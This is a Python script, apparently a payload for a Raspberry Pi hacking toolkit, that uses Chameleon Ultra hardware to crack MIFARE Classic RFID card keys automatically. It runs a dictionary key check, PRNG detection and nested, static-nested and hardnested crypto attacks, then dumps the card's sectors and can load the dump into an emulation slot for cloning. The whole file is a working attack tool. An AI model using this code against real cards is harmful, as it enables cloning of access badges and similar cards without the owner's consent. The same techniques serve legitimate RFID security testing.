#!/usr/bin/env python3
"""
RaspyJack Payload -- Chameleon Ultra Autopwn
=============================================
Auto-crack MIFARE Classic keys using Chameleon Ultra hardware-accelerated
crypto attacks: batch key check, darkside, nested, hardnested.
Full dump + optional load into emulation slot.

Controls:
  OK         Start autopwn / Load to slot (after complete)
  UP/DOWN    Scroll key results / Select slot
  KEY1       Select target slot
  KEY2       Save dump
  KEY3       Exit / Stop
"""

import os
import sys
import time

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads.nfc_rfid._nfc_driver import (
    auto_detect, ChameleonUltraDriver, is_classic,
    MIFARE_AUTH_A, MIFARE_AUTH_B,
)
from payloads.nfc_rfid._nfc_keys import KNOWN_KEYS, save_keymap
from payloads.nfc_rfid._nfc_cards import save_dump

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
DEBOUNCE = 0.18
_last_btn = 0

_CU_SUCCESS = {0x0000, 0x0068, 0x0040}
CMD_DETECT_PRNG = 2002
CMD_CHECK_KEYS = 2012
CMD_DARKSIDE = 2004
CMD_NESTED = 2006
CMD_STATIC_NESTED = 2003
CMD_HARDNESTED = 2013

PRNG_NAMES = {0: "Weak", 1: "Static", 2: "Hard"}
BATCH_SIZE = 20


def _btn():
    global _last_btn
    b = get_button(PINS, GPIO)
    now = time.time()
    if b and now - _last_btn < DEBOUNCE:
        return None
    if b:
        _last_btn = now
    return b


def _check_keys_batch(drv, keys, key_type):
    """Use CMD 2012 to test multiple keys against all sectors at once.
    Returns a dict mapping sector_num -> key_bytes for sectors that matched."""
    if not keys:
        return {}
    kt = 0x60 if key_type == MIFARE_AUTH_A else 0x61
    data = bytes([kt, len(keys)]) + b"".join(k[:6] for k in keys)
    result = drv.command(CMD_CHECK_KEYS, data, timeout=10.0)
    if not result or result[0] not in _CU_SUCCESS:
        return {}
    bitmask = result[1]
    found = {}
    for sec in range(min(40, len(bitmask) * 8)):
        byte_idx = sec // 8
        bit_idx = sec % 8
        if byte_idx < len(bitmask) and (bitmask[byte_idx] >> bit_idx) & 1:
            found[sec] = keys[0] if len(keys) == 1 else None
    if len(keys) == 1 and found:
        for sec in found:
            found[sec] = keys[0]
    return found


def _check_single_key_sectors(drv, key, key_type):
    """Check one key against all sectors. Returns set of sector numbers where it works."""
    return _check_keys_batch(drv, [key], key_type)


def _detect_prng(drv, block, key, key_type):
    """Detect PRNG type. Returns 0=weak, 1=static, 2=hard, or -1 on failure."""
    kt = 0x60 if key_type == MIFARE_AUTH_A else 0x61
    data = bytes([kt, block]) + key[:6]
    result = drv.command(CMD_DETECT_PRNG, data, timeout=5.0)
    if result and result[0] in _CU_SUCCESS and result[1]:
        return result[1][0]
    return -1


def _draw_grid(d, n_sectors, sector_states, current_sec, y_start):
    """Draw sector grid. States: 'cracked'=green, 'cracking'=yellow, 'locked'=red, 'unknown'=dark."""
    cols = 8 if n_sectors > 16 else 4
    cell = min(12, 100 // cols)
    gx = (127 - cols * cell) // 2

    colors = {
        "cracked": "#00FF00",
        "cracking": "#FFAA00",
        "locked": "#FF4444",
        "unknown": "#1a1a1a",
    }

    for si in range(n_sectors):
        cx = gx + (si % cols) * cell
        cy = y_start + (si // cols) * cell
        state = sector_states.get(si, "unknown")
        if si == current_sec and state not in ("cracked",):
            col = "#FFAA00"
        else:
            col = colors.get(state, "#1a1a1a")
        d.rectangle((cx, cy, cx + cell - 2, cy + cell - 2), fill=col)


def main():
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()

    font = scaled_font(10)
    font_sm = scaled_font(9)
    font_xs = scaled_font(9)

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 50), "Detecting CU...", font=font_sm, fill="#FFAA00")
    lcd.LCD_ShowImage(img, 0, 0)

    drv, drv_desc = auto_detect()
    if not isinstance(drv, ChameleonUltraDriver):
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 40), "Chameleon Ultra", font=font, fill="#FF4444")
        d.text((4, 58), "Required", font=font, fill="#FF4444")
        d.text((4, 80), f"Found: {drv_desc[:18]}", font=font_sm, fill="#888")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    card = None
    running = False
    complete = False
    sector_keys = {}
    sector_states = {}
    n_sectors = 16
    phase = ""
    prng_type = -1
    start_time = 0
    keys_tested = 0
    scroll = 0
    target_slot = 0
    dump_data = None

    try:
        while True:
            btn = _btn()

            if btn == "KEY3":
                if running:
                    running = False
                else:
                    break

            if btn == "UP":
                if complete:
                    scroll = max(0, scroll - 1)
                else:
                    target_slot = (target_slot - 1) % 8

            if btn == "DOWN":
                if complete:
                    scroll += 1
                else:
                    target_slot = (target_slot + 1) % 8

            if btn == "KEY1":
                target_slot = (target_slot + 1) % 8

            if btn == "KEY2" and dump_data and card:
                fname = save_dump(card.uid, card.card_type, dump_data)
                save_keymap(card.uid_hex, [
                    {"sector": s, "key": k.hex().upper(),
                     "key_type": "A", "cracked": True}
                    for s, k in sector_keys.items()
                ])
                phase = f"Saved: {fname[:14]}"

            if btn == "OK":
                if complete and dump_data:
                    drv.set_active_slot(target_slot)
                    drv.command(1004, bytes([target_slot, 3]))
                    drv.command(1001, b"\x00")
                    phase = f"Loaded slot {target_slot}"
                elif not running and not complete:
                    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                    d = ScaledDraw(img)
                    d.text((4, 50), "Place card...", font=font_sm, fill="#FFAA00")
                    lcd.LCD_ShowImage(img, 0, 0)

                    card = drv.read_passive_target(timeout=5.0)
                    if not card or not is_classic(card):
                        phase = "Not Classic" if card else "No card"
                        card = None
                        time.sleep(0.03)
                        continue

                    n_sectors = 40 if "4K" in card.card_type else 16
                    running = True
                    complete = False
                    sector_keys = {}
                    sector_states = {s: "unknown" for s in range(n_sectors)}
                    start_time = time.time()
                    keys_tested = 0
                    prng_type = -1
                    dump_data = None
                    phase = "Quick check..."

                    # ── PHASE 1: Batch key check (fast) ──
                    top_keys = KNOWN_KEYS[:200]
                    for batch_start in range(0, len(top_keys), BATCH_SIZE):
                        if not running:
                            break
                        batch = top_keys[batch_start:batch_start + BATCH_SIZE]
                        keys_tested += len(batch)

                        for key in batch:
                            if not running:
                                break
                            for kt in [MIFARE_AUTH_A, MIFARE_AUTH_B]:
                                hits = _check_single_key_sectors(drv, key, kt)
                                for sec in hits:
                                    if sec not in sector_keys and sec < n_sectors:
                                        sector_keys[sec] = key
                                        sector_states[sec] = "cracked"

                        cracked = len(sector_keys)
                        pct = keys_tested * 100 // len(top_keys)
                        phase = f"Dict {pct}% ({cracked}/{n_sectors})"

                        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                        d = ScaledDraw(img)
                        d.rectangle((0, 0, 127, 12), fill="#111")
                        d.text((2, 1), "CU AUTOPWN", font=font_sm, fill="#FF00FF")
                        elapsed = int(time.time() - start_time)
                        d.text((80, 1), f"{elapsed}s", font=font_xs, fill="#888")
                        d.text((2, 16), f"UID: {card.uid_hex[:12]}", font=font_xs, fill="#00FF00")
                        d.text((2, 26), phase, font=font_xs, fill="#FFAA00")
                        _draw_grid(d, n_sectors, sector_states, -1, 38)
                        bar_y = 90
                        d.rectangle((4, bar_y, 123, bar_y + 6), outline="#333")
                        bw = max(1, int(119 * pct / 100))
                        d.rectangle((4, bar_y, 4 + bw, bar_y + 6), fill="#FF00FF")
                        d.text((2, 100), f"Cracked: {cracked}/{n_sectors}  Tested: {keys_tested}", font=font_xs, fill="#888")
                        d.rectangle((0, 116, 127, 127), fill="#111")
                        d.text((2, 117), "KEY3:Stop", font=font_xs, fill="#666")
                        lcd.LCD_ShowImage(img, 0, 0)

                        if len(sector_keys) >= n_sectors:
                            break

                    # ── PHASE 2: PRNG detect + crypto attacks ──
                    if running and len(sector_keys) < n_sectors and sector_keys:
                        first_key_sec = next(iter(sector_keys))
                        first_key = sector_keys[first_key_sec]
                        block0 = first_key_sec * 4
                        prng_type = _detect_prng(drv, block0, first_key, MIFARE_AUTH_A)
                        prng_name = PRNG_NAMES.get(prng_type, "Unknown")
                        phase = f"PRNG: {prng_name} — Nested..."

                        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                        d = ScaledDraw(img)
                        d.rectangle((0, 0, 127, 12), fill="#111")
                        d.text((2, 1), "CU AUTOPWN", font=font_sm, fill="#FF00FF")
                        d.text((2, 16), f"PRNG: {prng_name}", font=font_sm, fill="#00CCFF")
                        d.text((2, 30), "Running nested attack...", font=font_xs, fill="#FFAA00")
                        _draw_grid(d, n_sectors, sector_states, -1, 44)
                        lcd.LCD_ShowImage(img, 0, 0)

                        for target_sec in range(n_sectors):
                            if not running:
                                break
                            if target_sec in sector_keys:
                                continue
                            sector_states[target_sec] = "cracking"
                            target_block = target_sec * 4

                            recovered = False
                            for kt_target in [MIFARE_AUTH_A, MIFARE_AUTH_B]:
                                if recovered:
                                    break
                                tkt = 0x60 if kt_target == MIFARE_AUTH_A else 0x61

                                if prng_type == 0:
                                    cmd = CMD_NESTED
                                elif prng_type == 1:
                                    cmd = CMD_STATIC_NESTED
                                else:
                                    cmd = CMD_HARDNESTED

                                payload = bytes([0x60, block0]) + first_key[:6] + bytes([tkt, target_block])
                                result = drv.command(cmd, payload, timeout=15.0)

                                if result and result[0] in _CU_SUCCESS and result[1]:
                                    if drv.mifare_auth(target_block, first_key, card.uid, kt_target):
                                        sector_keys[target_sec] = first_key
                                        sector_states[target_sec] = "cracked"
                                        recovered = True
                                    else:
                                        for try_key in KNOWN_KEYS[:50]:
                                            if drv.mifare_auth(target_block, try_key, card.uid, kt_target):
                                                sector_keys[target_sec] = try_key
                                                sector_states[target_sec] = "cracked"
                                                recovered = True
                                                break

                            if not recovered:
                                sector_states[target_sec] = "locked"

                            cracked = sum(1 for s in sector_states.values() if s == "cracked")
                            elapsed = int(time.time() - start_time)
                            phase = f"Nested {target_sec}/{n_sectors} ({cracked} found)"

                            img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                            d = ScaledDraw(img)
                            d.rectangle((0, 0, 127, 12), fill="#111")
                            d.text((2, 1), "CU AUTOPWN", font=font_sm, fill="#FF00FF")
                            d.text((80, 1), f"{elapsed}s", font=font_xs, fill="#888")
                            d.text((2, 16), f"UID: {card.uid_hex[:12]}", font=font_xs, fill="#00FF00")
                            d.text((2, 26), phase, font=font_xs, fill="#FFAA00")
                            _draw_grid(d, n_sectors, sector_states, target_sec, 38)
                            bar_y = 90
                            pct = (target_sec + 1) * 100 // n_sectors
                            d.rectangle((4, bar_y, 123, bar_y + 6), outline="#333")
                            bw = max(1, int(119 * pct / 100))
                            d.rectangle((4, bar_y, 4 + bw, bar_y + 6), fill="#00CCFF")
                            d.text((2, 100), f"Cracked: {cracked}/{n_sectors}  {elapsed}s", font=font_xs, fill="#888")
                            d.rectangle((0, 116, 127, 127), fill="#111")
                            d.text((2, 117), "KEY3:Stop", font=font_xs, fill="#666")
                            lcd.LCD_ShowImage(img, 0, 0)

                    # ── PHASE 3: Full dump ──
                    if running and sector_keys:
                        phase = "Dumping..."
                        sectors_data = []

                        for sec in range(n_sectors):
                            block = sec * 4
                            key = sector_keys.get(sec)
                            blocks = []
                            if key:
                                for b in range(4):
                                    data = drv.mifare_read(block + b)
                                    blocks.append(data.hex() if data else "?" * 32)
                            sectors_data.append({
                                "sector": sec,
                                "blocks": blocks,
                                "key": key.hex().upper() if key else "",
                                "key_type": "A",
                            })

                        dump_data = {"sectors": sectors_data}

                    running = False
                    complete = True
                    cracked = len(sector_keys)
                    elapsed = int(time.time() - start_time)
                    prng_name = PRNG_NAMES.get(prng_type, "N/A")
                    phase = f"DONE {cracked}/{n_sectors} in {elapsed}s"

            # ── Draw ──
            img = Image.new("RGB", (WIDTH, HEIGHT), "black")
            d = ScaledDraw(img)
            d.rectangle((0, 0, 127, 12), fill="#111")
            d.text((2, 1), "CU AUTOPWN", font=font_sm, fill="#FF00FF")

            bat = drv.get_battery()
            if bat:
                col = "#00FF00" if bat[1] > 30 else "#FFAA00" if bat[1] > 10 else "#FF4444"
                d.text((90, 1), f"{bat[1]}%", font=font_xs, fill=col)

            y = 16

            if complete and card:
                cracked = len(sector_keys)
                prng_name = PRNG_NAMES.get(prng_type, "N/A")
                elapsed = int(time.time() - start_time)

                d.text((2, y), f"UID: {card.uid_hex}", font=font_sm, fill="#00FF00")
                y += 12
                d.text((2, y), f"{cracked}/{n_sectors} cracked  {elapsed}s", font=font_sm,
                       fill="#00FF00" if cracked == n_sectors else "#FFAA00")
                y += 12
                d.text((2, y), f"PRNG: {prng_name}  {card.card_type}", font=font_xs, fill="#888")
                y += 12

                _draw_grid(d, n_sectors, sector_states, -1, y)
                grid_rows = (n_sectors + (8 if n_sectors > 16 else 4) - 1) // (8 if n_sectors > 16 else 4)
                y += grid_rows * 12 + 4

                results_list = [
                    f"S{s:02d} {k.hex().upper()}"
                    for s, k in sorted(sector_keys.items())
                ]
                max_vis = min(3, len(results_list))
                for i in range(scroll, min(len(results_list), scroll + max_vis)):
                    if y > 105:
                        break
                    d.text((2, y), results_list[i], font=font_xs, fill="#ccc")
                    y += 10

                d.rectangle((0, 116, 127, 127), fill="#111")
                d.text((2, 117), f"OK:Slot{target_slot} K2:Save K3:X", font=font_xs, fill="#666")

            elif running:
                pass

            elif card is None:
                d.text((4, 40), "Place MIFARE Classic", font=font_sm, fill="#888")
                d.text((4, 55), "card and press OK", font=font_sm, fill="#888")
                d.text((4, 80), f"Slot: {target_slot}  Keys: {len(KNOWN_KEYS)}", font=font_xs, fill="#555")
                d.rectangle((0, 116, 127, 127), fill="#111")
                d.text((2, 117), "OK:Start K1:Slot K3:X", font=font_xs, fill="#666")

            else:
                d.text((2, y), phase[:24], font=font_sm, fill="#FFAA00")
                d.rectangle((0, 116, 127, 127), fill="#111")
                d.text((2, 117), "OK:Start K3:Exit", font=font_xs, fill="#666")

            if not running:
                lcd.LCD_ShowImage(img, 0, 0)

            time.sleep(0.03)

    finally:
        drv.close()
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
